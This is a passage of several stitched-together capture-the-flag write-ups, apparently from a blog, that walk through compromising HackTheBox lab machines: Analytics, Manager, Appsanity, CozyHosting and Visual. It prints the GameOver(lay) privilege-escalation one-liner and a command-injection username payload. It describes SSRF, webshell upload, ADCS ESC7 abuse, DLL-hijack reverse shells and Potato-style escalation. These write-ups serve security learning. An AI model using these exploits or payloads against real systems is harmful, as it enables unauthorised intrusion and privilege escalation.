The password works for the metalytics user for SSH into the host machine:
And I can grab user.txt:

Category: Shell as root
The filesystem is relatively bare. There’s nothing of interest in metalytics’ home directory, and no other users in /home.
The nginx configuration directory shows two site configurations:
analytical has the web root in /var/www/site, and also has the check against the Host header ($host) to redirect if it isn’t analytical.htb:
data.analytical.htb is configured to match on that host name (server_name) and to pass everything to localhost:3000 (which I can conclude must be a pass through to the Metabase Docker container):
The web root in /var/www/site show that it’s just a static page as I guessed:
The /proc directory is mounted with hidepid=invisible:
This means that users can only see processes they start:
So nothing interesting here.
The operating system is, as identified above, Ubuntu 22.04:
The kernel version is:
A search for the kernel version with the word “vulnerability” returns a bunch of references to GameOver(lay):
This was a very trendy bug in the information security newcycle in late July 2023, just before Analytics was submitted to HTB on 10 August and released on 7 October.
Gameover(lay) is a vulnerability in the OverlayFS, which is a mount filesystem for Linux, and common on many distributions. Julia Evans has a great post and cartoon on how OverlayFS is used to power things like Docker containers:
The exploit for Gameover(lay) is surprisingly short, some joking that it “fits in a tweet”:
Exploit is so easy it fits in a tweet🔥unshare -rm sh -c "mkdir l u w m && cp /u*/b*/p*3 l/;setcap cap_setuid+eip l/python3;mount -t overlay overlay -o rw,lowerdir=l,upperdir=u,workdir=w m && touch m/*;" && u/python3 -c 'import os;os.setuid(0);os.system("id")' https://t.co/qb53rfeh0y pic.twitter.com/O9lcif1Yad
And yet it’s pretty dense. It’s fine to grab an exploit and run it, but it’s better to understand what it’s doing. I’ll break it down in this video:
In the video I mentioned that the version of Python in u, while also having the capability isn’t executed that way. IppSec pointed out to me that the u version has different extended attributes, including trusted.overlay.origin. That would typically be viewable with getfattr, but that isn’t installed on Analytics. It is also visible with Python’s os module (and running as root):
It could also be related to the value of the security.capability attribute.
The exploit I like is this:
This code escalates and runs the id command, and pasting it in returns a user id of root:
If I update that by replacing id with bash:
And grab root.txt:
CTF solutions, malware analysis, home lab development

Difficulty Rating:
Release Date : 21 Oct 2023
OS : Windows
Base Points : Medium [30]
Nmap scan:
Host is up (0.10s latency).
Not shown: 65513 filtered ports
PORT      STATE SERVICE
53/tcp    open  domain
80/tcp    open  http
88/tcp    open  kerberos-sec
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
389/tcp   open  ldap
445/tcp   open  microsoft-ds
464/tcp   open  kpasswd5
593/tcp   open  http-rpc-epmap
636/tcp   open  ldapssl
1433/tcp  open  ms-sql-s
3268/tcp  open  globalcatLDAP
3269/tcp  open  globalcatLDAPssl
5985/tcp  open  wsman
9389/tcp  open  adws
49667/tcp open  unknown
49669/tcp open  unknown
49670/tcp open  unknown
49671/tcp open  unknown
49721/tcp open  unknown
55791/tcp open  unknown
56862/tcp open  unknownCategory: Recon
nmap finds a bunch of open TCP ports:
There’s a lot here!
Before checking the webserver, I’ll brute force subdomains of manager.htb to see if any return something different with ffuf:
It doesn’t find anything. I’ll update my hosts file:
The site is for a content writing service:
There is a contact form, but submitting it sends a GET request to /contact.html without any of the data from the form.
The pages on the site are all .html files, which indicates a static site.
The HTTP response headers shows IIS and not much more:
The 404 page is the standard IIS 404:
Seems like static site running on IIS.
I’ll run feroxbuster against the site using a lowercase wordlist with Windows IIS:
Nothing interesting.
netexec shows the same domain and hostname:
I can’t enumerate shares with no user, and a bad user does seen to get some auth, but then can’t list shares either:
Given that some kind of null auth is allowed here, I can try a RID cycling attack, by bruteforcing Windows user security identifiers (SIDs) by incrementing the relative identifier (RID) part. The Impacket script loopupside.py will do this nicely:
The number before the : in the output is the RID. I’ll use some Bash foo to get a nice users list:
I can also do this with netexec, just need to use the guest account:
I’ll use ldapsearch to confirm the base domain name:
When I try to query further, it says I need auth, which I don’t have:
An alternative way to find usernames is by bruteforcing Kerberos with something like kerbrute:
It finds three, administrator, guest, and operator. I can use some other wordlists and find a handful more, but the important one is operator.

Category: Shell as raven
I can do a quick check to see if any of the usernames I’ve collected use their username as their password. With netexec, I’ll give the same list for -u and -p, and the --no-brute flag, which means instead of tying each username with each password, it just tries the first username with the first password, the second with the second, and so on. I like the --continue-on-success flag to check if there are more then one set of valid creds here:
The operator account uses the password operator! It doesn’t work over WinRM, so no shell from here:
The shares on Management are the standard DC shares:
There’s nothing too interesting in these.
The operator account does have LDAP access:
Running ldapsearch -H ldap://dc01.manager.htb -x -D 'operator@manager.htb' -w operator -b "DC=manager,DC=htb" will dump a bunch of LDAP to the terminal. I’ll use ldapdomaindump to get all the info in a more viewable way:
The domain_users_by_group.html file is a nice overview of the users to target:
Raven is a good target to get shell over WinRM. Nothing else seems interesting.
The creds work for the database as well:
mssqlclient.py will connect, using the -windows-auth flag to say that it’s using the OS authentication, not creds within the DB:
There are four DBs:
All four are default MSSQL databases.
mssqlclient.py has extra shortcut commands to do common attacker things on the DB:
enum_db will show the same thing I queried above:
xp_cmdshell is feature in MSSQL to run commands on the system. operator doesn’t have access, and can’t enable it:
xp_dirtree is another feature for listing files on the filesystem. It works:
The only interesting directory in C:\Users is Raven, and it is unaccessible. In the web root, I’ll confirm that this is a static HTML site:
There’s also a backup zip!
I’ll grab the archive from the webserver:
And extract it:
The first file, .old-conf.xml is interesting. It has an LDAP configuration for the raven user including a password:
The LDAP enumeration showed that raven is in the Remote Management Users group, which means they should be able to WinRM. netexec confirms, and that this password works:
I’m able to connect and get a shell:
And grab user.txt:

Category: Shell as administrator
raven’s home directory is otherwise completely empty:
There’s no other user directories, and the web directory doesn’t have anything else interesting.
With a Windows domain, the next thing to check used to be Bloodhound, but lately it’s worth checking Advice Directory Certificate Services (ADCS) as well, and that’s quick, so I’ll start there. This can be done by uploading Certify or remotely with Certipy. I find Certipy easier.
I’ll look for vulnerable templates:
The last line is the most important! Raven has dangerous permissions, with the label ESC7.
ESC7 is when a user has either the “Manage CA” or “Manage Certificates” access rights on the certificate authority itself. Raven has ManageCa rights (shown in the output above).
The steps to exploit this are on the Certipy README.
First, I’ll need to use the Manage CA permission to give Raven the Manage Certificates permission:
Now Raven shows up there where they didn’t before:
This gets reset periodically, so if I find some step breaks while exploiting, it’s worth going back to see if that is why.
The first step is to request a certificate based on the Subordinate Certification Authority (SubCA) template provided by ADCS. The SubCA template serves as a predefined set of configurations and policies governing the issuance of certificates.
This fails, but it saves the private key involved. Then, using the Manage CA and Manage Certificates privileges, I’ll use the ca subcommand to issue the request:
Now, the issued certificate can be retrieved using the req command:
With this certificate as the administrator user, the easiest way to get a shell is to use it to get the NTLM hash for the user with the auth command. This requires the VM and target times to be in sync, with otherwise leads to this failure:
I’ll use ntpdate to sync my VM’s time to Manager’s:
Now it works, leaking the hash:
With the hash, I can get a shell as administrator using Evil-WinRM:
And grab root.txt:
CTF solutions, malware analysis, home lab development

Difficulty Rating:
Release Date : 28 Oct 2023
OS : Windows
Base Points : Hard [40]
Nmap scan:
Host is up (0.11s latency).
Not shown: 65532 filtered ports
PORT     STATE SERVICE
80/tcp   open  http
443/tcp  open  https
5985/tcp open  wsmanCategory: Recon
nmap finds three open TCP ports, HTTP (80), HTTPS (443), and WinRM (5985):
This is clearly a Windows host, Windows 10/11 or Server 2016+. The website on port 80 is redirecting to https://meddigi.htb. The site on 443 returns nothing.
Visiting http://10.10.11.238 immediately returns a 302 redirect to https://meddigi.htb, just as nmap showed. Interetingly, visiting https://10.10.11.238 just crashes:
I suspect they meant to have a redirect up here as well.
I’ll try to fuzz subdomains on both HTTP and HTTPS. On HTTP, it finds nothing:
On HTTPS, every single request fails in an error:
I’ll add meddigi.htb to my /etc/hosts file:
If I now fuzz again targeting https://meddigi.htb, it doesn’t error, and does find another subdomain:
I’ll add portal.meddigi.htb to my hosts file as well.
The TLS certificate on 443 shows the same hostname, meddigi.htb:
The site is for a medical consulting company:
There’s not too much of interest on the site, but I can register an account. On doing so and logging in, there’s a profile page (/Profile):
Not much here. I can send a message to the supervisors, but no XSS payloads seem to connect back.
The HTTP response headers show again that this is IIS:
On the initial visit (before logging in) it sets a blank .AspNetCore.Mvc.CookieTempDataProvider cookie, which suggests this is an ASP .NET application. That cookie does get set while browsing around the site.
I’m not able to guess any extensions. On a bad page, it just redirects to /Home.
On logging in, another cookie is set:
That’s a JWT set as the access_token, which decodes to:
I’ll run feroxbuster against the site, using a lowercase wordlist as IIS isn’t case sensitive. It doesn’t return anything I don’t already know about:
/error returns:
The site presents a login form:
To log in, I’ll need an email and “Doctor Ref.Number”.
The HTTP response headers look exactly the same as the main site:
feroxbuster finds a couple endpoints that require auth (302 redirects to /Login), but not much else:

Category: Shell as svc_exampanel
Looking at the POST request to register an account, there’s an interesting field in the body:
In addition to the data entered in the form, there’s a Acctype parameter. That comes from a hidden input tag in the HTML form:
The response to a successful login is a 302 redirect to /Signin.
I’ll send this request to Burp Repeater and mess with that a bit. If I set it to 0, the response is a 302 redirect to /Signup. This implies failure registering.
If I change that to 2, it redirects to /Signin:
Going up to 3 leads back to /Signup, so it seems like 1 and 2 are the only valid values here.

Category: Auth as Doctor on Main Site
If I log in with the account created with type 2, now it shows the account is a Doctor:
There’s not much else here. I can add patients to be supervised, but it doesn’t seem to do much.
The tech stacks of the two websites seem very similar. Thinking about the JWT that gets set when I log in on the main site, if the portal site was written by the same developers, it could have used the same signing secret and the same cookie name. If that’s the case, the cookie generated by one would be valid on the other.
I’ll go into the dev tools and create a cookie for portal.meddigi.htb, placing the doctor level cookie from the other site in there:
On refreshing, the browser redirects to /Profile:
It’s the same info as the other site as well!
Each of the items in the menu bar on the left have different forms that can be submitted. The two most interesting are “Issue Prescriptions” (/Prescriptions) and “Upload Report” (/examreport).
The Prescriptions page is interesting because one of the items it takes is a link:
Any time I can submit a link to a site it’s worth digging into. If I put in my host as the link:
On hitting submit, it contacts my Python webserver:
And displays the result:
If I create that page:
On submitting again, it shows the page:
Looks like a solid server-side request forgery (SSRF).
The Reporting page allows for file upload:
I’ll fill it out, and after passing all the client-side validation, submit, and it returns:
If I use a PDF, it shows:
I’ve already shown an SSRF above in the Prescriptions panel. I’ll use that to fuzz listening ports on the internal network, in this case on localhost.
This command is a bit tricky to build, so I’ll work up to it slowly. I’ll start by getting rid of headers in the request to make sure I know which ones actually matter. I’ll submit in the site, and send the request to Repeater. Then I can get rid of a couple headers, send, and make sure the response is the same. That confirms I can get rid of those headers. Content-Type is a good one to notice - without that the request fails. I’ll need that when I craft a ffuf command.
In Repeater, I’ll look at what happens with it requests a link on a listening port on my host:
It’s a 200 response, with the actual HTML from my host in the body. It’s also a very fast response, about 3.5 seconds.
If I change that to a port that’s not listening (81), it returns a 302 to /Error:
It also takes 2.7 seconds, way longer! That makes sense, as it’s trying to connect and waiting for a timeout.
My initial gut was to scan all 65535 ports, but that proved way too slow, especially because I want to fuzz on both HTTP and HTTPS. I’ll start with a wordlist from SecLists, common-http-ports.txt. I’ll need to include:
On HTTPS it finds nothing:
On HTTP, it finds 8080:
Back in the browser, I’ll submit http://127.0.0.1:8080 as the prescription url:
Interestingly, not only does it show a line that’s always there, but the second line in this table is a report I’ve recently uploaded! If I scroll over, there’s a link to the PDF:
I can grab the URL from that, and back in Repeater, fetch the PDF:
At this point, I have access to files that I upload.
As this is a .NET webserver, I would like to upload an ASPX webshell and see if I can trigger it via the SSRF. I’ll upload my PDF again, and get that request into Repeater. I’ve observed that the filename it gets saved at seems to prepend some data but then end in _[original file name]. My first question is if I can change the file extension to .aspx and get it to still upload. I’ll not change the payload, but only the form data filename:
The response looks just like the unmodified request! I’ll use the SSRF to load http://127.0.0.1:8080 and see that the file does exist at the .aspx extension. I can pull the file too:
Back in the Repeater tab submitting the PDF, I’ll try to remove the PDF body and replace it with text. If I remove the entire thing and just have “0xdf was here”, it still looks successful:
But the file isn’t there with the SSRF.
However, if I leave the start of the PDF (the “magic bytes”) and replace the body with my text like this:
Then there is a new link, and I can fetch it over the SSRF:
So the webserver seems to be validinting the file based on the magic bytes.
I’ll grab an ASPX reverse shell from GitHub, and put it in place of my text, making sure to update the callback IP and port. To make things easier, I’ll update the patient name to “reverseshell” (spaces break it). I’ll upload it, and fetch the admin page via the SSRF in the web browser:
The report link is https://portal.meddigi.htb/ViewReport.aspx?file=887947b0-f4ba-4939-8181-7d9d195b7d21_dummy.aspx, so I’ll update my SSRF trigger in Repeater (with nc listening):
When I send, it just hangs, but a few seconds later at nc:
The user flag is on the exampanel user’s desktop:
Running powershell converts this shell from cmd to powershell, which is also nice.

Category: Shell as devdoc
There are a handful of other users on the box:
The svc_exampanel user can’t access any of these directories.
The net user command gives similar results:
The C:\inetpub directory has the IIS-related files:
My guess is that MedDigi is the main site, MedDigiPortal is the portal site, and ExaminationPanel is the private site on 8080. This user can’t access the other sites.
In ExaminatinPanel, there’s another directory of the same name, which has:
Reports has the uploaded reports (though my webshell has been cleaned up, presumably by some HTB cleanup script).
bin has the executables that run the site:
All but one of these, if I search for them, return references to frameworks for web development in .NET. ExaminationManagement.dll is custom to Appsanity.
I’ll start an SMB server on my host using Impacket’s smbserver.py:
Now on Appsantiy I’ll connect to the share and copy the file into it:
I’ve got the file on my system:
My tool of choice at the moment for reversing .NET binaries is DotPeek, though if I wanted to stay on a Linux VM I could use ILSpy.
I’ll open it up, and take a look:
Looking at index, there are functions related to encryption / decryption:
RetrieveEncryptionKeyFromRegistery is an interesting sounding function:
It reads from the Local Machine hive the key Software\MedDigi, getting the value EncKey.
In PowerShell, I can enter registry hives like drives with directories:
Get-ItemProperty will show the values of this key:
The EncKey is “1g0tTh3R3m3dy!!”.
To check if any known user on this box uses this key, I’ll save all the users from net user in a file on my host and spray with NetExec. SMB isn’t accessible, but I can try WinRM:
I like --continue-on-success to see if multiple users share the password. It works for devdoc, and gets a shell with Evil-WinRM:

Category: Shell as administrator
In looking around the host, I’ll notice there are a bunch more ports listening than the three I can connect to from my host:
Before I start pinging SMB and LDAP, port 100 jumps out as unusual. The output above shows this as PID 4880, which I can get from the process list if I’m fast:
The process seems to be restarting quickly, so I’ll write a single line of PowerShell to get the process id and then pull the process information:
The process listening on port 100 is ReportManagement.
There’s a directory in C:\Program Files\ named ReportManagement:
All of this enumeration could have been done as svc_exampanel, but it’s worth noting that that user couldn’t read this binary:
While looking at permissions in this directory, I’ll notice that the Libraries directory is owned by devdoc:
It is currently empty, which is suspicious.
devdoc cannot access the ReportManagementHelper.exe binary:
Trying to interact with the binary doesn’t work over HTTP or HTTPS:
I’ll start the Chisel server on my VM and upload the Windows binary to Appsanity to get a tunnel to localhost:
There’s an error, but my server shows the tunnel:
And I can interact with it over nc:
help shows the commands:
I can try some of the commands, but nothing too interesting:
There’s no connect back to my host that I see on the upload command.
I’ll copy all the files that I can back to my host using SMB again. As noted above, devdoc doesn’t have read access to ReportManagementHelper.exe.
These are not .NET binaries, so I’ll use Ghidra, starting with ReportManagement.exe. Looking at the strings to get oriented, there are a bunch of interesting ones all grouped together in memory and where they are referenced:
There’s a couple references to upload. There’s a reference to the binary I can’t access, ReportManagementHelper, and cmd.exe. There’s the writable Libraries directory. And “externalupload” and “dll”. Each of these strings is used in FUN_1400042b0.
This function is huge, and the decompile from Ghidra is a mess. The decompilation output is 2212 lines.
After 317 lines of declaring variables, there’s a reference to reportmanagement_log.txt, and then it enters a do while true loop starting at line 340 in my Ghidra output:
There is a call to CreateProcessW shortly after the reference to ReportManagementHelper.exe, which would make sense to have that called:
I’ll copy all the files I have to my Windows VM in a folder on my Desktop. I’ll also start Process Monitor (or ProcMon) running to collect events.
When I run ReportManagement.exe, it creates a reportmanagement_log.txt file in ~/logs. This file shows an error that it failed to find a directory:
It’s not important to find this log, as I would find this also using ProcMon. I’ll also note that the process runs in the background and listens on TCP 100 (notice the PID matches) just like on Appsanity:
In ProcMon, I’ll set up a filter so that I only get events from ReportManagement.exe, and to start, I’ll look at attempts to interact with files that fail by filtering on CreateFile operations that result in anything but SUCCESS:
There’s a bunch of failures trying to open C:\inetpub\ExaminationPanel\ExaminationPanel\Reports:
The .exe.mun file is something related to resources, which I’ll ignore for now. I’ll run stop-process -name ReportManagement in PowerShell, create this directory, and run it again. This time it fails to find C:\Users\Administrator\Backup. I’ll create this as well. Now when I run, no failures.
Given all the interesting strings in the binary were used between messages about uploading, I’ll start by focusing on the upload command. I’ll connect to my local instance and enter upload 0xdf (as the command takes an “external source”). It’s not important what I put for the source, but I want something that might fail to see where it fails.
When I do, there’s another failure in ProcMon, showing a failure:
I’ll move my ReportManagement directory into C:\Program Files and continue. Now there are no errors.
I’ll run the program in x64dbg, but it doesn’t reach the CreateProcessW call.
The writable Libraries directory seems important, so I’ll go back to where that’s used. The code is still very hard to understand, but there are references to directory_iterator and directory_entry:
Given that, I’ll create a few files in my local Libraries:
Now I’ll start the program in x64dbg. There’s a while loop that starts at 140004900 that only enters if there are files in Libraries. Stepping into the loop, it loads the string .dll, and then test.dll:
Still, it doesn’t reach CreateProcessW. A bit further down, the “externaupload” string is referenced with a memcmp:
To get here, there are a series of checks. So the loop goes over each file in Libraries. If it has the .dll extension, then it finds the first “e” (memchr call at 1400004cb5) and compares the string from that point to “externalupload” (memcmp at 140004ce0). If that matches, then it reaches the CreateProcessW call (at 140005387):
The command would be cmd.exe /c ReportManagementHelper Libraries\externalupload.dll.
I don’t have access to ReportManagementHelper.exe, but it seems if there’s a externalupload.dll in Libraries that it will be passed to that executable when it is called, which suggests it will be loaded. Since I can write to Libraries, I’ll generate a malicious DLL that creates a reverse shell, upload it, and then connect and trigger it.
I haven’t seen any AV running here, so the simplest idea is to generate a DLL payload using msfvenom from Metasploit.
I’m using an unstaged payload so I can catch it in nc. If I had used windows/x64/shell/reverse/tcp, that would create one I had to catch in Metasploit.
I’ll upload this to the Libraries directory:
Now I’ll connect to the service over my Chisel tunnel and trigger it:
It hangs, and there’s a shell as administrator:
And root.txt:
CTF solutions, malware analysis, home lab development

Difficulty Rating:
Release Date : 02 Sep 2023
OS : Linux
Base Points : Easy [20]
Nmap scan:
Host is up (0.12s latency).
Not shown: 65533 closed ports
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  httpCategory: Recon
nmap finds two open TCP ports, SSH (22) and HTTP (80):
Based on the OpenSSH version, the host is likely running Ubuntu 22.04 jammy.
The HTTP server on 80 is redirecting to cozyhosting.htb. Given the use of host based routing, I’ll fuzz for other subdomains that reply differently, but not find any.
The site is for a web hosting company:
All of the links on the page except for the “Login” button at the top right go to other places on the page.
The login page asks for username and password:
Some simple guesses like admin / admin don’t work.
The HTTP response headers show nginx as the web server:
There are some other less common headers, but nothing that identifies what’s in use. When I try to log in, even on failure, there’s a cookie set:
JSESSIONID suggests a Java-based web framework.
The 404 page is interesting:
That matches the default error page for Java Spring Boot:
I’ll run feroxbuster against the site:
There’s a /admin page that requires auth.
/error shows a similar error to the 404 error:
SecLists has a specific wordlist for Springboot. I’ll run feroxbuster again with this list:
The /actuator path is interesting, and everything else is a part of that.
Spring Boot includes a set of features that are designed for monitoring, managing, and debugging applications known as actuators. /actuator/mapping gives a detailed list about the application, including not only the actuators, but also other endpoints for the application:
That’s a ton of data, but with some jq foo I can get a nice list:
/addhost and /executessh, but I’ll come back to those.
/actuator/env lead what looks like some configuration values, but a lot of the interesitng ones (and some not interesting ones) are masked, shown as strings of “*”.
/actuator/sessions is immediately interesting:
If try and fail to log in a few times, more sessions show up:

Category: Shell as app
I’ll go into Firefox dev tools, under Storage -> Cookies and replace the value for JSESSIONID with the kandersons user’s cookie.
Now when I refresh /login or visit /admin, there’s a panel and I’m authenticated as K. Anderson:
The interesting part of the page is the form at the bottom. If I submit my IP as the hostname and 0xdf as the username, it returns an error after short wait:
This is a POST request to /executessh (noticed above).
I’ll try that again with Wireshark running, but there’s no connection to my host. There must be a firewall blocking outbound connections.
I’ll try having it target localhost. It’s a different error:
Based on the error message, and that it said it’s using a private key, it seems likely that the server is running ssh -i [key] [username]@[hostname] to connect. If that’s the case, I can test for command injection vulnerabilities. My first attempt returns “Invalid hostname!”:
This indicates that there’s some kind of filtering going on. I’ll try & and | instead of ;, but the same result. Before fuzzing to see what are the banned characters, I’ll try in the username field. It’s a different error message:
There are a couple ways to get whitespace without spaces in a Linux terminal context. I’ll use ${IFS} as a Bash environment variable that is a space, and it kind of works:
It’s making the command:
It’s interesting that it handles 0xdf as 0.0.0.223, but not important. It’s failing SSH, and then trying to ping 10.10.14.6@localhost. So my command is a bit broken, but it’s working. I’ll add a comment # to the end:
It shows failure, but at my box with tcpdump, I see a ICMP packet:
That’s command injection!
Alternatively, I can also get spaces added in Bash with brace expansion, so the username 0xdf;{ping,-c,1,10.10.14.6};# works as well, making:
Which expands to:
Java applications can be very tricky about piping and special characters in processes, so I’ll go the simple route of writing a Bash script to disk and then running it. I’ll create a reverse shell script locally called rev.sh:
I’ll switch my requests over to Burp Repeater for quicker sending. I’ll use curl to fetch rev.sh from my server:
It works:
But there’s an error in the response:
If I move to /tmp/rev.sh, it seems to work:
I’ll submit another request to run bash /tmp/rev.sh:
The request just hangs, but at my listening nc, there’s a shell:
I’ll upgrade my shell using the script technique:

Category: Shell as josh
The web application is running out of /app, which container a Java Jar file:
That Jar is running:
That process is listening on 8080:
And I can see that nginx is forwarding traffic for cozyhosting.htb to port 8080:
There is one user with a home directory, but app cannot access it:
There’s not much else interesting that app can access.
I’m going to take a look at the web application, and there are a couple of approaches that both get to the same information I need to move forward:
Jar files are Java Archive files. They contain all the files needed to run the Java application (in this case a web server), and are actually just Zip file. The quick and dirty way to take a copy of it and just unzip it to take an initial look:
The entry point for the application is defined in the MANIFEST.MF file as htb.cloudhosting.CozyHostingApp:
But I’ll save the code analysis for a nicer application. Having all these files allows me to do things like looks for passwords:
The first line has a datasource password, which looks interesting. I’ll inspect that file:
It’s the database connection information.
I’ll start nc listening forwarding any output to cloudhosting-0.0.1.jar on my host:
On CozyHosting, I’ll send the Jar into nc back to my host:
This hangs, but on my host it shows a connection:
After a few seconds, I’ll kill it on my side, and make sure the md5sum of the two files matches.
I’ll I’ll download the jd-gui Jar file and run it with java -jar jd-gui-1.6.6.jar, opening the Jar file. The htb.cloudhosting.CozyHostingApp class just starts the Spring Boot application:
The application.properties file is right there as well, with the DB info:
I’ll connect to Postgres using the psql utility installed on CozyHosting:
There is really one interesting database:
It has two tables, hosts and users:
The hosts table isn’t interesting, but the users table has hashes in it:
I’ll make a hashes file with those two hashes:
hashcat isn’t able to automatically detect the hash type:
I’m including --user because my hashes have [username]: at the front of each line.
3200 is the most generic type, so I’ll start with that:
admin’s password is “manchesterunited”.
The other user on the box is josh, and that password works with su:
Or I can get a clean shell with SSH:
Either way, I can grab user.txt:

Category: Shell as root
The josh user can run ssh as root using sudo:
There’s a GTFObins page for ssh, but it’s more fun to look at the man page. SSH has an option called ProxyCommand. I actually use this in real life to connect to SSH servers through a socks proxy. I have an SSH config file that looks like this:
When I run ssh [hostname], it runs nc connecting to localhost:1080 as a SOCKS5 (-X 5) proxy, and then my SSH connection can travel over that proxy.
The ProxyCommand is run on the client before making the connection, so I can abuse that to do arbitrary things as the user who is running the ssh command. In this case, that’s root because of sudo. I’ll show touching a file:
It works. I can use this to make a SetUID bash:
Now running it (with -p to not drop privs) gives a root shell:
GTFObins gives a shorter path, using redirection to get the shell immediately from the ssh process:
Either way, I can grab the flag:
CTF solutions, malware analysis, home lab development

Difficulty Rating:
Release Date : 30 Sep 2023
OS : Windows
Base Points : Medium [30]
Nmap scan:
Host is up (0.092s latency).
Not shown: 65534 filtered ports
PORT   STATE SERVICE
80/tcp open  httpCategory: Recon
nmap finds one open TCP port, HTTP (80):
Based on the Apache version, this his a Windows host, running a PHP webserver.
The site offers a service that compiles Visual Studio projects:
At the bottom, there’s text field to “Submit Your Repo”:
I know that HTB labs can’t access the internet, but giving it https://github.com/0xdf/test returns a message that says it’s trying:
This page is at /uploads/bc52b27d25b2eb4fa36827c369fe26/, and refreshes itself every few seconds, until it shows:
.sln is the extension for a Visual Studio project file, so that fits the theme.
The site is a PHP site. Submissions go to /submit.php. The main site loads as http://10.10.11.234/index.php. Adding index.php to the end of the uploads path also loads.
The HTTP response headers don’t give much else of interest:
The 404 page is the default Apache page:
I’ll run feroxbuster against the site, and include -x php since I know the site is PHP:
It makes sense that the directories don’t seem to be case sensitive (standard for Windows). There are some 403s for webalizer, phpmyadmin, and examples. Might be the default XAMPP configuration.

Category: Shell as enox
It seems clear that I need to get the site to upload some kind of malicious Visual Studio project. The first step is to get it to connect to something I control.
I’ll start a Python webserver on my VM and give the site a URL using my HTB VPN IP:
It takes a minute after I submit, but eventually there’s a request:
To get a better look at that, I’ll kill the webserver and listen on 80 with nc, and send the same URL:
It’s using git to try to get a repository from my server over HTTP.
I need to host a Git server. Gitea seems like as good as any option. I’ll use Docker to get an instance up and running. First, I’ll pull the image:
Now I’ll run the server, telling Docker to forward port 3000 through to me:
Visiting http://127.0.0.1:3000 offers the Gitea setup:
It’s important to create an account at the bottom under “Administrator Account Settings”:
On clicking “Install Gitea”, it refreshes (and may crash, but on refreshing again) I’ve got a Gitea instance.
Before I try to exploit this, I want to understand how the application works. I’m going to make a Hello World dummy application and upload it to Visual. I’ll show both how to do this in Windows and on Linux.
I’ll create my own Visual Studio project by opening Visual Studio and creating a new project, select C# Console App, and give it the name Hello0xdf:
On the next screen I’ll make sure to pick .NET 6.0 (as that’s what the site on Visual said they support):
In the project that opens, there’s a Program.cs that has a simple print:
This creates a Hello0xdf folder that has a Hello0xdf.sln file in it:
The Hello0xdf folder in that has the source files, as well as the Hello0xdf.csproj file, which is also important:
If I “Build” -> “Build Solution”, it shows it generates a .dll executable:
There’s actually a bunch of files, including a .exe:
I’ll copy these files back to my Linux host where I’ve got Gitea, and I’ll create a new repo:
I’ll name it “Hello0xdf”, and follow the instructions for creating a new repo around my project:
Now it shows up in Gitea:
If I don’t want to go over to a Windows VM, I can make a project in Linux with dotnet. .Net version can be a real pain, so it’s easiest to just use a Docker container specifically for .NET 6 as the website says it supports (like I did in Keeper). I’ll make a directory for this project, and share it into the container:
I am mounting the project directory into the container from my host so that I can use the container to make the project, but then my host to interact with Gitea and not have to worry about networking.
I’ll create a project:
This creates a project with a Hello World program:
Now I need a Visual Studio solution file (.sln):
This creates the .sln file, but doesn’t associate it at all with the .csproj:
I need to tie these together:
Now the .sln has a reference to the .csproj.
This builds and runs:
I’ll push that to Gitea the same way as the previous, creating a new repo, and then adding the remote (now back in my VM, out of the container):
I’ll submit both of these to Visual via the web form. The result for my project returns the same files I got when building above:
If I have the .exe, the .dll, and the .runtimeconfig.json file in the same directory, they run:
The Linux build is similar (as long as I have the .NET version correct):
It is possible to configure a project to run “pre-build” and “post-build” event commands. This article from HowToGeek goes into it. My idea here is to use a pre-build command to get execution when I submit it to the site and it builds the project. I’ll show three ways to do this:
In Visual Studio, I’ll go to “Project” -> “Hello0xdf Properties” to get the properties dialog, and under “Build” -> “Events” there’s a “Pre-build event” section. I’ll add a ping:
If I try to build the project now, I’ll see it’s trying to ping my VPN IP (which the Windows VM isn’t aware of):
Looking at git, there are a few updated files, but it’s the .csproj file that’s interesting:
I’ll push that to Gitea:
I’ll submit this repo to Visual, and have tcpdump listening for ICMP. After a couple minutes, I get pinged:
And then it reports success:
The file that changed was the .csproj file, so I can just update that in my HelloLinux project. It starts as:
I’ll add a “PreBuild” target:
If I dotnet build this in the container:
It fails because ping is not found. That’s ok, it’s trying to run the command!
I’ll update Git and push to Gitea:
Now when I resubmit the URL for this repo, I get ICMP packets at my host from Visual:
And then it shows success:
It turns out that the author of this box also has a repo on Github called vs-rce that’s been up since before Visual’s release. It’s a simple VS project:
In rce, the Program.cs is the default Hello World. The rce.csproj has the trigger (done slightly more simply than I showed):
In my Gitea instance, I’ll select “New Migration”:
I’ll select GitHub, and on the next page git it the URL for this repo. It copies the repo into Gitea:
I’ll edit the rce.csproj file to replace calc.exe with ping 10.10.14.6:
I’ll save and commit that, and then submit the URL for this repo to Visual. After a minute or so, there’s ICMP packets:
To get a shell, I’ll update the HelloLinux.csproj file, replacing the ping with a PowerShell one-liner (PowerShell #3 (Base64) from https://www.revshells.com/):
I’ll add and commit that to git, and the push to Gitea and resubmit to Visual. Eventually, I get a shell at nc:
I can get the user flag:

Category: Shell as local service
The host is relatively empty. The only other interesting thing in the enox user’s home directory is  compile.ps1, which seems like it handles the compilation for the website. It reads a list of submissions to compile from a text file:
It then loops through that file, processing and compiling with msbuild.exe and updating the todo.txt file.
This isn’t useful for a next step on it’s own, but it does show that enox can read and write within at least part of the xampp directories.
The C:\xampp\htdocs directory is the root of the webserver:
I’ll try writing a PHP file there:
It works:
It’s worth noting that PowerShell is weird about encoding if I use echo. For example:
This will not work because it writes 16-bit characters (as can be seen in the site of the files):
fail.php is twice the size of 0xdf.php, despite the content looking the same. I can also see this by fetching fail.php from the webserver:
The encoding is causing XAMPP to not run it as PHP.
I’ll update 0xdf.php to a PHP webshell:
The site is running as nt authority\local service:
I’ll replace whoami with the reverse shell from above, and on hitting enter, there’s a shell at nc:

Category: Shell as system
I would expect local service to have some privileges, but it seems that they have been stripped away:
When Windows starts a service as local service or network service, the service starts with a reduced set of privileges that might be available to that user. A researcher found that if a scheduled tasks is started as one of those users, the full set of privileges comes with it, including SeImpersonate.
A tool, FullPowers automates that process. There’s a compiled .exe on the release page.
I’ll download the executable to my host, and serve it with a Python web server. I’ll fetch it with wget on Visual:
If I just run this, it seems to work, but then doesn’t:
That’s because of how my reverse shell is running. It’s doing a loop to run commands, return the result, and then wait. In this case, it runs FullPowers.exe, which results in a new prompt, but then that exits and it drops back to my original prompt without the new powers.
If I give it whoami /priv, it confirms that it is working:
There’s a bunch more privileges there, including SeImpersonate.
I’ll give it the same reverse shell again:
It hangs, but at nc:
And this shell has SeImpersonate:
I’ve shown many Potato exploits over the years. Microsoft keeps trying to block ways to use SeImpersonate to get a system shell, and researchers keep finding new ways. The current popular exploit is GodPotato.
